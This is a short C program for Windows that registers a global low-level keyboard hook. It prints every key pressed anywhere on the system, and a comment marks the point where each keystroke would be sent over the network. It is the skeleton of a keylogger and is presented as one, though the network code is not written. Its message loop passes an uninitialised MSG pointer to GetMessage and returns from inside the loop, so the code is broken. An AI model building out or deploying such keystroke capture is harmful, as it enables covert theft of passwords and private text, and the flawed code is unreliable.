#include <windows.h>
#include <stdio.h>


LRESULT CALLBACK hook_fn(int n_code,WPARAM KB_MSG_TYPE,LPARAM KBDLLHOOKSTRUCT_def){
if(KB_MSG_TYPE == 0x0104){
 // system keys (f10 or alt + key(s)
  
 }
else if(KB_MSG_TYPE==0x0100){
KBDLLHOOKSTRUCT* kbdll_config=(KBDLLHOOKSTRUCT*) KBDLLHOOKSTRUCT_def;
DWORD vkey=kbdll_config->vkCode;
char key=MapVirtualKeyA(vkey,MAPVK_VK_TO_CHAR);
if (key!=0){
printf("%c\n",key);
// send key over network
}
}
return CallNextHookEx(NULL,n_code,KB_MSG_TYPE,KBDLLHOOKSTRUCT_def);
}


int main(){

 HHOOK hook=SetWindowsHookExA(WH_KEYBOARD_LL,hook_fn,NULL,0);
 
 if(!hook){
  printf("Failed to execute SetWindowsHookExA(...)");
  return 1;
 }

 MSG* msg_data;
 BOOL ret;

 while((ret=GetMessage(msg_data,NULL,0,0))!=0){
  if (ret==-1){
	  printf("Error While GetMessage(...)");
	  return 1;
  }else{

  TranslateMessage(msg_data);
  DispatchMessage(msg_data);

  }

 return 0;
}
}
